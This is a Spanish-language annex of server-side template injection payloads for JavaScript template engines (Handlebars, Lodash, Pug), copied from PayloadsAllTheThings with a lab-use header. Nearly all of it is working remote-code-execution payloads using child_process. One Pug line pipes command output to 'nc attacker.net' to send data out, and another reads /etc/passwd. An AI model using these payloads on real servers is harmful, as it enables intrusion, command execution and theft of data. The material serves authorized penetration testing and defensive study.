# Server-Side Template Injection (SSTI): anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Server Side Template Injection/JavaScript.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Inyección en plantillas del servidor - JavaScript / Templating Libraries

### Variantes presentes en tablas o texto del apartado

```text
{{= }}
{ }
<% %>
{{ }}
#{ }
#=set($X="")$X
```

## 2. Inyección en plantillas del servidor - JavaScript / Universal Payloads

```javascript
// Rendered RCE
global.process.mainModule.require("child_process").execSync("id").toString()

// Error-Based RCE
global.process.mainModule.require("Y:/A:/"+global.process.mainModule.require("child_process").execSync("id").toString())
""["x"][global.process.mainModule.require("child_process").execSync("id").toString()]

// Boolean-Based RCE
[""][0 + !(global.process.mainModule.require("child_process").spawnSync("id", options={shell:true}).status===0)]["length"]

// Time-Based RCE
global.process.mainModule.require("child_process").execSync("id && sleep 5").toString()
```

### Variantes presentes en tablas o texto del apartado

```text
{{range.constructor(' ... ')()}}
```

## 3. Handlebars / Handlebars - Básicos Inyección

```js
{{this}}
{{self}}
```

## 4. Handlebars / Handlebars - Ejecución de comandos

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Variantes presentes en tablas o texto del apartado

```text
>= 4.1.0
< 4.1.2
>= 4.0.0
< 4.0.14
< 3.0.7
```

## 5. Lodash / Lodash - Básicos Inyección

```javascript
const _ = require('lodash');
string = "{{= username}}"
const options = {
  evaluate: /\{\{(.+?)\}\}/g,
  interpolate: /\{\{=(.+?)\}\}/g,
  escape: /\{\{-(.+?)\}\}/g,
};

_.template(string, options);
```

```javascript
{{= _.VERSION}}
${= _.VERSION}
<%= _.VERSION %>


{{= _.templateSettings.evaluate }}
${= _.VERSION}
<%= _.VERSION %>
```

## 6. Lodash / Lodash - Ejecución de comandos

```js
{{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id;ls"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
```

## 7. Inyección en plantillas del servidor - JavaScript / Pug

```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
